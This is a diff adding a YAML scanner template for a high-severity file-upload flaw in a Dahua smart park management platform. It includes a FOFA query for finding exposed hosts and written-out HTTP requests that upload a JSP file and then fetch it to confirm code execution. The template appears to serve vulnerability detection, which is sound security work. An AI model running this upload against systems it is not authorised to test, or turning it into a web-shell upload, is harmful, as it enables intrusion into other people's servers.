@@ -1,0 +1,54 @@
+id: dahua-WPMS
+info:
+  name: dahua-WPMS
+  author: hufei
+  severity: high
+  description: |
+  reference:
+  metadata:
+    max-request: 1
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    verified: true
+    product: dahua-WPMS
+  tags: 2023,HVV,dahua
+
+http:
+  - raw:
+      - |
+        POST /publishing/publishing/material/file/video HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/533.0 (KHTML, like Gecko) FxiOS/11.8w0575.0 Mobile/69G115 Safari/533.0
+        Content-Length: 349
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=e00b34d08d13639f8b619829b04c1a29
+
+        --e00b34d08d13639f8b619829b04c1a29
+        Content-Disposition: form-data; name="Filedata"; filename="test.jsp"
+
+        <%out.print("{{randstr}}");%>
+        --e00b34d08d13639f8b619829b04c1a29
+        Content-Disposition: form-data; name="poc"
+
+        poc
+        --e00b34d08d13639f8b619829b04c1a29
+        Content-Disposition: form-data; name="Submit"
+
+        submit
+        --e00b34d08d13639f8b619829b04c1a29--
+      - |
+        GET /publishingImg/{{name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: name
+        json:
+          - ".data.path"
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - '{{randstr}}'
